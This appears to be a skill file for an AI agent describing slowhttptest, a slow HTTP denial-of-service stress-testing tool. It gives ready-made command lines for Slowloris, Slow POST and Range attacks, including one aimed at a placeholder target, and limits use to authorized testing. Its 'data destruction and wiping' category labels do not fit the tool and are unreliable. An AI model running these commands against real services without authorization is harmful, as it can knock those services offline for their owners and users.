---
name: slowhttptest-dos
description: "slowhttptest: slow HTTP denial-of-service stress testing. Signals: data destruction, wipe, Slowloris test, Range attack, duration seconds."
zh-signals: "slowhttptest: Web 服务慢速拒绝服务压测。信号:数据破坏,擦除,Slowloris 测试,Range 攻击,持续秒数。"
when-to-use: >-
  Use when validating the resilience of a web service against application-layer
  denial-of-service attacks such as Slowloris, Slow HTTP POST, and Range attacks;
  only in authorized stress-testing scenarios.
---

# slowhttptest

- Attack Category: C39 Data Destruction and Wiping
- Upstream Repository: https://github.com/shekyan/slowhttptest
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install slowhttptest or compile from source
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `-c 1000 -H -i 10 -r 200 -t GET -u https://t.com` | Slowloris test |
| `-c 3000 -B -g -o body_stats -i 110 -r 200 -s 8192 -u URL` | Slow HTTP POST |
| `-c 8000 -R -u URL -r 200 -t POST` | Range attack |
| `-l 300` | Duration in seconds |

## Attack Scenario Playbook

### Slow denial-of-service stress testing against a web service

```bash
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://auth-target.com -l 120
# Exhausts the web server connection pool with low bandwidth, validating WAF/rate limiting effectiveness
```

## Notes

Application-layer DoS stress testing tool; use only in authorized resilience validation scenarios.
